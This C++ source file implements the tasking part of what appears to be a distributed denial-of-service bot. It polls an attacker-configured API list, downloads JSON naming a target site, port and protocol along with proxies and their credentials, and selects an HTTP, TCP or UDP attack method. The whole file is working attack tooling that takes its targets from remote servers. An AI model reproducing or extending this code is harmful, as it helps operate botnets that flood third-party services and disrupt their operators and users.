#include <algorithm>
#include <iostream>

#include "nlohmann/json.hpp"
#include "spdlog/spdlog.h"

#include "api_interface.h"

#include "target.hpp"

#include "config.h"
#include "curl_wrapper.h"
#include "utils.h"

void Informator::LoadResouces(const TaskController &task) noexcept
{
	nlohmann::json hostsData;

	auto wrapper = CURLLoader();

	// Getting hosts list
	wrapper.SetTarget(AttackerConfig::APIS_LIST);
	while(!task.ShouldStop())
	{
		if(auto resp = wrapper.Download();
			resp->m_code >= 200 && resp->m_code < 300)
		{
			try
			{
				hostsData = nlohmann::json::parse(resp->m_data);
			}
			catch(...)
			{
				SPDLOG_ERROR("Failed to parse hosts list");
			}
			break;
		}
		else
		{
			SPDLOG_WARN("Failed to load hosts list!");
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
			SPDLOG_WARN("Trying again to load hosts");
		}
	}

	m_availableResources.reserve(hostsData.size());
	for(auto uri : hostsData)
	{
		m_availableResources.push_back(uri);
	}
	SPDLOG_INFO("Succesfully got APIs");
}

bool Informator::LoadNewData() noexcept
{
	const std::string apiURI{ChoseAPI(m_availableResources)};

	CURLLoader apiDownloader;
	apiDownloader.SetTarget(apiURI);

	nlohmann::json data;
	SPDLOG_INFO("Loading API response from: {}", apiURI);
	if(auto resp = apiDownloader.Download())
	{
		if(resp->m_code >= 200 && resp->m_code < 300)
		{
			if(resp->m_data.empty())
			{
				return false;
			}
			resp->m_data.push_back('\0');
			try
			{
				SPDLOG_INFO("Beggining parsing bytes to json object");
				data = nlohmann::json::parse(resp->m_data.data());
				SPDLOG_INFO("Finished parsing bytes to json object");

				m_proxies = {};
				m_target = {};
				m_method = {};

				SPDLOG_INFO("Parsing and validating json data");
				ParseProxies(data);
				ParseTarget(data);
				ParseMethod(data);
				SPDLOG_INFO("Finished parsing and validating json data");

				return true;
			}
			catch(...)
			{
				SPDLOG_WARN("Failed to parse API");
				SPDLOG_INFO("Invalid API: {}", resp->m_data.data());
				return false;
			}
		}
	}

	SPDLOG_ERROR("Failed to load API response");
	return false;
}

void Informator::ParseProxies(const nlohmann::json &jsonObject)
{
	m_proxies = std::vector<Proxy>();
	m_proxies->reserve(jsonObject["proxy"].size());

	std::pair<std::string, std::string> proxyVal;

	for(auto proxy : jsonObject["proxy"])
	{
		if(!proxy.contains("ip"))
		{
			continue;
		}

		proxyVal.first = proxy["ip"];
		for(auto iter = std::begin(proxyVal.first); 
			iter != std::end(proxyVal.first); iter++)
		{
			if(*iter == '\r' || *iter == '\n')
			{
				proxyVal.first.erase(iter);
			}
		}

		if(proxy.contains("auth"))
		{
			proxyVal.second = proxy["auth"];
			for(auto iter = std::begin(proxyVal.second); 
				iter != std::end(proxyVal.second); iter++)
			{
				if(*iter == '\r' || *iter == '\n')
				{
					proxyVal.second.erase(iter);
				}
			}
		}

		m_proxies->emplace_back(std::move(proxyVal));
	}
}

void Informator::ParseTarget(const nlohmann::json &jsonObject)
{
	if(jsonObject.contains("site") && jsonObject["site"].contains("page") && jsonObject["site"].contains("port"))
	{
		m_target = DecodeURL(jsonObject["site"]["page"]);
		int portNumber{0};
		try
		{
			portNumber = jsonObject["site"]["port"].get<int>();
		}
		catch(...)
		{
			m_target = {};
			return;
		}
		m_target->SetPort(portNumber);
	}
}

void Informator::ParseMethod(const nlohmann::json &jsonObject)
{
	if(jsonObject.contains("site") && jsonObject["site"].contains("protocol"))
	{
		std::string methodString = jsonObject["site"]["protocol"];
		std::transform(std::begin(methodString), 
			std::end(methodString), std::begin(methodString), tolower);
		if(methodString == "http" || methodString == "https")
		{
			m_method = Attackers::AttackMethod::HTTPAttack;
		}
		else if(methodString == "tcp")
		{
			m_method = Attackers::AttackMethod::TCPAttack;
		}
		else if(methodString == "udp")
		{
			m_method = Attackers::AttackMethod::UDPAttack;
		}
	}
}
